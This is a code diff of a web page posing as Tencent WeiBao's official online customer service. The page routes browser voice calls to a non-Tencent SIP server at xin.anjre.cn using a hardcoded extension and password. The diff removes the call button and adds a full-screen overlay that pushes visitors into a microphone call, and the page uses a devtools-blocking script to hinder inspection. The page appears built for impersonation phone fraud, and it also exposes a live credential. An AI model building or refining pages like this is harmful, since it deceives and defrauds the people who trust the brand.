@@ -46,7 +46,6 @@
       max-width: 96vw;
       margin-bottom: 28px;
     }
-    /* 客服头像样式 */
     .profile-avatar {
       width: 64px;
       height: 64px;
@@ -65,7 +64,7 @@
       letter-spacing: 2px;
       font-weight: 700;
     }
-    #callButton, #hangupButton {
+    #hangupButton {
       padding: 16px 44px;
       font-size: 20px;
       margin: 12px 10px;
@@ -74,21 +73,10 @@
       cursor: pointer;
       font-weight: 600;
       box-shadow: 0 2px 6px rgba(38,133,250,0.08);
-      transition: background 0.2s, box-shadow 0.2s;
-      outline: none;
-    }
-    #callButton {
-      background: linear-gradient(90deg, var(--main-blue) 0%, #47b4ff 100%);
-      color: #fff;
-    }
-    #callButton:disabled {
-      background: #a5c8f7;
-      color: #fff;
-      cursor: not-allowed;
-    }
-    #hangupButton {
       background: linear-gradient(90deg, #ee4747 0%, #ff8888 100%);
       color: #fff;
+      transition: background 0.2s, box-shadow 0.2s;
+      outline: none;
     }
     #hangupButton:disabled {
       background: #ffcccc;
@@ -122,7 +110,7 @@
       h1 {
         font-size: 22px;
       }
-      #callButton, #hangupButton {
+      #hangupButton {
         width: 92vw;
         min-width: 0;
         font-size: 17px;
@@ -136,44 +124,35 @@
   </style>
 </head>
 <body>
-
   <div class="logo-box">
-    <!-- 腾讯微保LOGO，建议替换为正式LOGO图片地址 -->
     <img src="https://static.weibocdn.com/assets/img/brand/webao_logo_blue.svg" alt="腾讯微保LOGO" onerror="this.style.display='none'">
   </div>
 
   <div class="main-content">
     <h1>腾讯微保在线客服</h1>
-    <!-- 职业风格的圆形女头像 -->
     <img class="profile-avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="客服头像" />
-    <button id="callButton" onclick="makeCall()">📞 呼叫客服</button>
     <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
-    <div id="callStatus">未呼叫</div>
+    <div id="callStatus">正在连接客服，请稍候...</div>
     <audio id="audioRemote" autoplay></audio>
   </div>
 
   <div class="footer">
     <strong>温馨提示：</strong><br>
-    您正在使用腾讯微保官方在线客服。点击“呼叫客服”按钮即可与专业客服通话。<br>
-    如需帮助，请随时点击“挂断”结束当前通话。微保将竭诚为您服务。<br>
-    客服服务时间：9:00-21:00（节假日无休）<br>
+    页面打开后将自动连接客服，请确保麦克风权限已开启。<br>
+    如需结束，请点击“挂断”。服务时间：9:00-21:00（节假日无休）<br>
     <span style="color:#a3a3a3;font-size:13px;display:block;margin-top:8px;">© 2025 腾讯微保 版权所有</span>
   </div>
 
-  <!-- ✅ 引入 JsSIP 和适配库 -->
   <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
-  <!-- ✅ 引入 disable-devtool 插件 -->
   <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
       const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
-
-      // 分机账号和密码
       const configuration = {
         sockets: [socket],
-        uri: 'sip:1002020@xin.anjre.cn', // 分机账号
-        password: 'Aa6363463@',           // 分机密码
+        uri: 'sip:1002020@xin.anjre.cn',
+        password: 'Aa6363463@',
         display_name: '腾讯微保网页客户',
         session_timers: false,
         register: true
@@ -183,29 +162,20 @@
       let session = null;
       let isCalling = false;
 
-      ua.on('connected', () => console.log('已连接到 SIP WebSocket'));
-      ua.on('registered', () => console.log('✅ 注册成功'));
-      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
-      ua.on('disconnected', () => console.log('❗️ WebSocket 断开'));
-      ua.start();
-
-      const callButton = document.getElementById('callButton');
-      const hangupButton = document.getElementById('hangupButton');
       const statusDisplay = document.getElementById('callStatus');
       const remoteAudio = document.getElementById('audioRemote');
+      const hangupButton = document.getElementById('hangupButton');
 
       function updateStatus(text) {
         statusDisplay.textContent = text;
       }
 
-      window.makeCall = function () {
+      function makeCall() {
         if (isCalling) return;
         isCalling = true;
-        callButton.disabled = true;
         hangupButton.disabled = false;
         updateStatus("正在呼叫客服，请稍候...");
 
-        // 呼叫队列 999999
         session = ua.call('sip:999999@xin.anjre.cn', {
           mediaConstraints: { audio: true, video: false },
           rtcOfferConstraints: {
@@ -230,20 +200,45 @@
           console.error('呼叫失败:', e);
           resetUI();
         });
-      };
-
-      window.hangupCall = function () {
-        if (session) {
-          session.terminate();
-        }
-      };
+      }
 
       function resetUI() {
         isCalling = false;
-        callButton.disabled = false;
         hangupButton.disabled = true;
         session = null;
       }
+
+      window.hangupCall = function () {
+        if (session) session.terminate();
+      };
+
+      ua.on('connected', () => console.log('✅ SIP WebSocket 已连接'));
+      ua.on('registered', () => {
+        console.log('✅ 注册成功，等待用户点击授权');
+        const overlay = document.createElement('div');
+        overlay.style.position = 'fixed';
+        overlay.style.top = 0;
+        overlay.style.left = 0;
+        overlay.style.width = '100vw';
+        overlay.style.height = '100vh';
+        overlay.style.backgroundColor = 'rgba(0,0,0,0.6)';
+        overlay.style.display = 'flex';
+        overlay.style.alignItems = 'center';
+        overlay.style.justifyContent = 'center';
+        overlay.style.zIndex = 9999;
+        overlay.innerHTML = `<button style="padding: 20px 40px; font-size: 22px; border: none; border-radius: 12px; background: #2685fa; color: #fff; cursor: pointer;">点击开始通话</button>`;
+        document.body.appendChild(overlay);
+
+        overlay.querySelector('button').addEventListener('click', () => {
+          makeCall();
+          document.body.removeChild(overlay);
+        });
+      });
+
+      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
+      ua.on('disconnected', () => console.warn('❗️ SIP 连接断开'));
+
+      ua.start();
     });
   </script>
 </body>
